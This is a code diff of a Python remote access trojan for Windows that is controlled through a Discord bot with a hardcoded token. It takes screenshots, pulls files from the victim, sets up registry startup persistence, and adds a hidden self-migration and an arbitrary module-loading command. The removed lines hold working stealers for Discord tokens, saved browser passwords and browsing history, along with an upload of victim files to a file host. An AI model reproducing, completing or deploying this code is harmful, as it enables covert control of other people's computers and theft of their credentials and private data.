@@ -1,6 +1,6 @@
 import os, discord, subprocess, requests, re, json, win32crypt, base64, shutil, sqlite3, winreg
-from Crypto.Cipher import AES
 from PIL import ImageGrab
+from Crypto.Cipher import AES
 from datetime import datetime
 
 APPDATA = os.getenv("APPDATA")
@@ -14,6 +14,23 @@ guild_id = "891685208506650664"
 token1 = "MTIzMjc2MTc3MDQzNTk0MDU1Ng."
 token2="GfhcqR.Y0SLLxCc2tDyVjL8gqFSf07DFR_0rwThJeK_Bg"
 token=token1+token2
+
+def migrate(path):
+    newPath=path+"/"+os.path.basename(__file__)
+    if os.path.exists(path):
+        shutil.copy(__file__,newPath)
+        print(newPath)
+        print(f"migrate to {newPath}")
+        return newPath
+    else:
+        try:
+            os.mkdir(path)
+            shutil.copy(__file__,newPath)
+            return newPath
+            return 0
+        except Exception as e:
+            print(e)
+    
 
 def get_processor():
     stdout = subprocess.Popen(
@@ -48,10 +65,8 @@ commands = "\n".join([
     "run <file> - Run an file",
     "exit - Exit the session",
     "screenshot - Take a screenshot",
-    "tokens - Get all discord tokens",
-    "passwords - Extracts all browser passwords",
-    "history - Extracts all browser history",
     "startup <name> - Add to startup",
+    "migrate <path> -Migrate to path"
 ])
 
 @bot.event
@@ -113,12 +128,12 @@ async def on_message(message):
         file = message.content[9:]
         print(file)
         try:
-            link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
-            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
+            filed = discord.File(f"{file}")
+            await message.reply(file=filed)
+        except Exception as Error:
+            embed=discord.Embed(title="Error!",description =f" list: {Error}",color=0xfafafa)
             await message.reply(embed=embed)
-        except:
-            embed = discord.Embed(title="Error", description=f"```File not found```", color=0xfafafa)
-            await message.reply(embed=embed)
+            
 
     if message.content.startswith("upload"):
         link = message.content[7:]
@@ -166,98 +181,7 @@ async def on_message(message):
         embed = discord.Embed(title="Current Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
         await message.reply(embed=embed)
         
-    if message.content == "tokens":
-        tokens = []
-        path = f"{APPDATA}\\discord"
-        if not os.path.exists(path):
-            return ["Discord not installed"]
-        local_state = open(f"{path}\\Local State", "r")
-        encrypted_master_key = base64.b64decode(json.loads(local_state.read())["os_crypt"]["encrypted_key"])
-        master_key = win32crypt.CryptUnprotectData(encrypted_master_key[5:], None, None, None, 0)[1]
-        for file_name in os.listdir(f"{path}\\Local Storage\\leveldb"):
-            if file_name[-3:] not in ["log", "ldb"]:
-                continue
-            for line in [x.strip() for x in open(f'{path}\\Local Storage\\leveldb\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
-                    encrypted_token = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])
-                    token = AES.new(master_key, AES.MODE_GCM, encrypted_token[3:15]).decrypt(encrypted_token[15:])[:-16].decode()
-                    token = token.replace(".", " ")
-                    tokens.append(token)
-        embed = discord.Embed(title="Tokens", description=f"```{tokens}```", color=0xfafafa)
-        await message.reply(embed=embed)
-                            
-    if message.content == "history":
-        paths = []
-        file = open(f"{TEMP}\\history.txt", "w")
-        for file, folder, files in os.walk(APPDATA):
-            if "History" in files:
-                paths.append(file) 
-        for file, folder, files in os.walk(LOCALAPPDATA):
-            if "History" in files:
-                paths.append(file) 
-        for path in paths:
-            if "History" not in os.listdir(path):
-                return
-            r_id = os.urandom(16).hex()
-            shutil.copy (f"{path}\\History", f"{TEMP}\\{r_id}.db")
-            connection = sqlite3.connect(f"{TEMP}\\{r_id}.db")
-            cursor = connection.cursor()
-            cursor.execute("SELECT url, title, last_visit_time FROM urls")
-            for col in cursor.fetchall():
-                url = col[0]
-                title = col[1]
-                last_visit_time = col[2]
-                f.write(f"{url} - {title} - {datetime.fromtimestamp(last_visit_time/1000000-11644473600).strftime('%Y-%m-%d %H:%M:%S')}\n")
-            connection.close()
-        file.close()
-        embed = discord.Embed(title="History", description="```See attachment```", color=0xfafafa)
-        file = discord.File(f"{TEMP}\\history.txt")
-        await message.reply(embed=embed, file=file)
-        
-    if message.content == "passwords":
-        paths = []
-        file = open(f"{TEMP}\\passwords.txt", "w")
-        for file, folder, files in os.walk(APPDATA):
-            if "Login Data" in files:
-                paths.append(file) 
-                
-        for file, folder, files in os.walk(LOCALAPPDATA):
-            if "Login Data" in files:
-                paths.append(file)
-        for path in paths:
-            if "Login Data" not in os.listdir(path):
-                return
-            r_id = os.urandom(16).hex()
-            try:
-                local_state = open(f"{path}\\Local State", "r")
-            except:
-                try: local_state = open(f"{path}\\..\\Local State", "r")
-                except: return
-            encrypted_master_key = base64.b64decode(json.loads(local_state.read())["os_crypt"]["encrypted_key"])
-            master_key = win32crypt.CryptUnprotectData(encrypted_master_key[5:], None, None, None, 0)[1]
-            shutil.copy (f"{path}\\Login Data", f"{TEMP}\\{r_id}.db")
-            connection = sqlite3.connect(f"{TEMP}\\{r_id}.db")
-            cursor = connection.cursor()
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            for col in cursor.fetchall():
-                url = col[0]
-                username = col[1]
-                try:
-                    password = AES.new(master_key, AES.MODE_GCM, col[2][3:15]).decrypt(col[2][15:])[:-16].decode()
-                except:
-                    try:
-                        password = win32crypt.CryptUnprotectData(col[2], None, None, None, 0)[1].decode()
-                    except:
-                        password = "Decryption failed"
-                if password == "":
-                    password = "Decryption failed"
-
-                file.write(f"{url} - {username} - {password}\n")
-            connection.close()
-        file.close()
-        embed = discord.Embed(title="Passwords", description="```See attachment```", color=0xfafafa)
-        file = discord.File(f"{TEMP}\\passwords.txt")
-        await message.reply(embed=embed, file=file)
+    
         
     if message.content.startswith("startup"):
         name = message.content[8:]
@@ -271,6 +195,24 @@ async def on_message(message):
             winreg.CloseKey(registry_key)
             embed = discord.Embed(title="Startup", description=f"```Added to startup as {name}```", color=0xfafafa)
             await message.reply(embed=embed)
+    if message.content.startswith("migrate"):
+        path=message.content[8:]
+        newPath=migrate(path)
+        await message.channel.delete()
+        os.system(f"powershell -WindowStyle Hidden python {newPath}")
+        await bot.close()
 
+    if message.content.startswith("load"):
+        lib=message.content[5:]
+        try:
+            types,data=exec(f"from /Modules/{lib} import *;mainInlib()")
+            print(types,data)
+        except Exception as e:
+            print(e)
+    
+            
+        
+
+            
+        
 bot.run(token)
-
